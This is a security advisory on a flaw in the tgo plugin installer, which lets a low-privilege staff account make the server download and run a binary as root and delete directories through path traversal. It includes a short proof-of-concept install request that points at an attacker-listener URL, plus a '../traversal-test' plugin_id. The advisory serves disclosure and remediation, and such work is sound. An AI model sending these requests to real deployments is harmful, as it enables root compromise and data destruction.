# Security Advisory: Unauthenticated-Role Remote Code Execution via Unvalidated Plugin Binary Installation in tgo

**Advisory ID:** NULLBENNY-2026-TGO-002
**CVE:** Pending assignment
**Date:** 28 September 2026
**Researcher:** nullbenny
**Vendor:** tgoai (github.com/tgoai/tgo)
**Vendor notified:** 28 June 2026 (GitHub issue #43)
**Follow-up sent:** 1 July 2026
**Public disclosure date:** 26 September 2026

---

## Summary

The plugin installer in tgoai/tgo v0.5.0 (commit `995da45`) executes attacker-controlled
binaries as root with no integrity, authenticity, or destination validation, and is
reachable by any authenticated staff account. The installer accepts a user-supplied binary
URL, downloads it via `curl` with no checksum or code-signing requirement, writes it to the
install directory as `plugin` with mode `0o755`, and executes it via
`asyncio.create_subprocess_exec`. The plugin-runtime container runs as root, so the
resulting code execution is as `uid=0`.

The same component also allows path traversal via an unsanitized `plugin_id` used in
filesystem path construction, and calls `shutil.rmtree()` on the resulting path at multiple
sites, enabling arbitrary directory deletion. The plugin install endpoint is gated only by
a login check with no role filter — the same Missing Authorization pattern reported
separately in NULLBENNY-2026-TGO-001 — so the entire chain is exploitable by the
lowest-privilege staff role.

This is a critical-severity finding: remote code execution as root, reachable by a
low-privilege authenticated user, confirmed end-to-end.

---

## Affected Versions

| Component | Confirmed vulnerable | Confirmed fixed |
|---|---|---|
| `tgoai/tgo` (`tgo-plugin-runtime`) | v0.5.0 (commit `995da45`, tested) | None — present in tested release |

v0.5.0 is the tested version. Other versions sharing the same plugin-installer implementation
are presumed affected but were not individually tested.

---

## Vulnerability Details

### CWE
- **CWE-494:** Download of Code Without Integrity Check (unsigned binary from an arbitrary URL)
- **CWE-88:** Argument / command construction issues in the download-and-execute path
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory (path traversal via `plugin_id`)
- **CWE-862:** Missing Authorization (install endpoint has no role check)

The primary impact is CWE-494 remote code execution. CWE-862 is what lowers the barrier to
any authenticated user; CWE-22 provides an additional filesystem-write/-delete primitive.

### CVSS v3.1
`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` — Base score 9.9 (Critical)

Notes:
- `PR:L` — a valid low-privilege staff account is required (the endpoint checks
  `get_current_active_user` only). No administrator access, no user interaction.
- `S:C` — code execution escapes the application's logical boundary into the host container
  as root, affecting resources beyond the vulnerable component's authorization scope.
- `C:H/I:H/A:H` — root code execution yields full confidentiality, integrity, and
  availability impact; the arbitrary `rmtree` deletion independently supports the
  availability and integrity ratings.

### Root Cause — Remote Code Execution (CWE-494)
The plugin installer accepts a user-supplied binary URL in the install request
(`source.binary.url`) and:

1. downloads it with `curl` (`installer.py` line 216, commit `995da45`) with no destination
   validation, no TLS/authenticity requirement, no checksum, and no code-signing check;
2. copies the downloaded file to the install directory as `plugin` with mode `0o755`;
3. executes it via `asyncio.create_subprocess_exec` (`process_manager.py` line 187).

No integrity or provenance control exists at any step. Comparable software-distribution
systems (npm, pip, VS Code extensions, OS package managers) universally require checksums,
signatures, or a verified registry before executing downloaded code; this installer requires
none. The plugin-runtime container runs as root, so execution occurs as `uid=0`.

### Root Cause — Path Traversal (CWE-22)
The `plugin_id` field is used directly in filesystem path construction
(`installer.py` line 45: `base_path / plugin_id`) with no sanitization. Python's `pathlib`
does not neutralize `../` sequences. A `plugin_id` of `../traversal-test` resolves outside
the intended base directory (confirmed: resolves to `/var/lib/tgo/traversal-test`, escaping
the base). `shutil.rmtree(install_dir)` is invoked at multiple call sites in the installer
(lines 50, 68, 74, 96, 106, 113, 122, 139, 186, 354), so a traversing `plugin_id` enables
deletion of arbitrary directories reachable by the runtime's root privileges.

### Root Cause — Missing Authorization (CWE-862)
The plugin install endpoint (`plugins.py` line 312) depends only on
`get_current_active_user`, with no role or permission filter. This is the same access-control
gap reported in NULLBENNY-2026-TGO-001 for the workflow endpoints: the codebase has and uses
a `require_permission()` primitive elsewhere (e.g. `staff.py`), but it is not applied here.
As a result, the RCE and path-traversal primitives are reachable by any authenticated staff
account, not only administrators.

### Confirmed Exploitation (End-to-End)
Executed against a local instance with an attacker-hosted canary binary:

1. An attacker-hosted ELF binary was served from an attacker-controlled URL.
2. A plugin install request was sent referencing that URL as `source.binary.url`.
3. The installer streamed its own progress: `downloading` → `copying` ("Extracting
   binary…") → `starting` ("Starting plugin process…") → `complete` ("Installation
   successful").
4. The runtime container (`172.22.0.11`) fetched the binary from the attacker listener
   (engine `curl/8.14.1`), then repeatedly issued callback requests to the listener,
   confirming execution.
5. The canary wrote `/tmp/tgo-rce-proof` inside the container containing
   `executed uid=0 gid=0 pid=2894`, confirming code execution as root.

All artifacts are synthetic; no real credentials or third-party systems were involved.

---

## Impact

| Aspect | Impact |
|---|---|
| Code execution | Arbitrary code execution as root (`uid=0`) inside the plugin-runtime container. Confirmed end-to-end. |
| Reachability | Exploitable by any authenticated staff account (no role check on the install endpoint). |
| Filesystem (write) | Attacker-controlled binary written to the install directory with mode `0o755`. |
| Filesystem (delete) | Arbitrary directory deletion via unsanitized `plugin_id` reaching `shutil.rmtree()`. |
| Blast radius | Root in the container; any secrets, mounted volumes, network position, or adjacent services reachable by that container are exposed. |

---

## Proof of Concept

Illustrative of the vulnerability class; the URL below targets a local attacker listener
serving a synthetic canary binary, not a production system.

```
POST /plugins/install-stream
Content-Type: application/json
Authorization: Bearer <low-privilege staff token>

{
  "id": "rce-proof-3",
  "name": "rce proof",
  "version": "0.0.1",
  "source":  { "binary": { "url": "http://<attacker-listener>/binary-install-probe" } },
  "build":   { "language": "binary" },
  "runtime": { "env": {} }
}
```

The installer downloads, chmods, and executes the referenced binary. Verification of
execution (inside the container):

```
$ docker compose exec tgo-plugin-runtime cat /tmp/tgo-rce-proof
executed uid=0 gid=0 pid=2894
```

**Path-traversal variant:** an install request whose `plugin_id` is `../traversal-test`
resolves the install directory outside the intended base (`/var/lib/tgo/traversal-test`),
placing the subsequent `shutil.rmtree()` target under attacker control.

> Any real exploitation of this class yields root on the host container. Treat any test
> instance as compromised after testing and rebuild it; do not run the PoC against shared
> infrastructure. All evidence for this advisory was captured against a local instance with
> a synthetic canary.

---

## Remediation

1. **Do not execute downloaded code without integrity and authenticity verification.**
   Require a cryptographic signature or, at minimum, a pinned checksum for any plugin binary
   before execution. Reject binaries that fail verification.

2. **Restrict plugin sources.** Replace arbitrary-URL download with a verified registry or an
   administrator-configured allowlist of trusted origins. Enforce TLS.

3. **Apply role-based authorization to the plugin install endpoint.** Gate `plugins.py`
   line 312 with the `require_permission()` primitive already used elsewhere in the codebase,
   restricting plugin installation to an appropriate administrative role.

4. **Sanitize `plugin_id` before path construction.** Reject or normalize `../` and absolute
   paths; validate that the resolved path stays within the intended base directory before any
   filesystem operation, and especially before `shutil.rmtree()`.

5. **Drop root in the plugin-runtime container.** Run the runtime as a non-root user with the
   minimum required privileges, so that even a successful execution primitive is contained.

---

## Evidence Summary

| Claim | Evidence |
|---|---|
| Unvalidated binary download | Attacker listener served binary; runtime container `172.22.0.11` fetched it via `curl/8.14.1` |
| Installer executes the binary | Progress stream reached `complete` ("Installation successful"); repeated callbacks to attacker listener |
| Code execution as root | `/tmp/tgo-rce-proof` inside container: `executed uid=0 gid=0 pid=2894` |
| Reachable by low-privilege role | Install request accepted with a low-privilege staff token (no role check) |
| Path traversal via `plugin_id` | `../traversal-test` resolved to `/var/lib/tgo/traversal-test` (escaped base) |
| Arbitrary directory deletion | `shutil.rmtree()` on attacker-influenced path (installer lines 50–354) |

All network evidence was captured against a local attacker listener. No live third-party
systems or real credentials were involved; the executed binary was a synthetic canary.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 28 Jun 2026 | Initial disclosure to vendor via GitHub issue #43 |
| 1 Jul 2026 | Follow-up email sent to the maintainer |
| 26 Sep 2026 | Public disclosure date (90 days from initial vendor contact); no vendor response received |

---

## References

- CWE-494: Download of Code Without Integrity Check
- CWE-88: Improper Neutralization of Argument Delimiters in a Command
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-862: Missing Authorization
- Related advisory: NULLBENNY-2026-TGO-001 (SSRF via missing authorization in the workflow API node)
- Vendor repository: https://github.com/tgoai/tgo
- Vendor issue: https://github.com/tgoai/tgo/issues/43
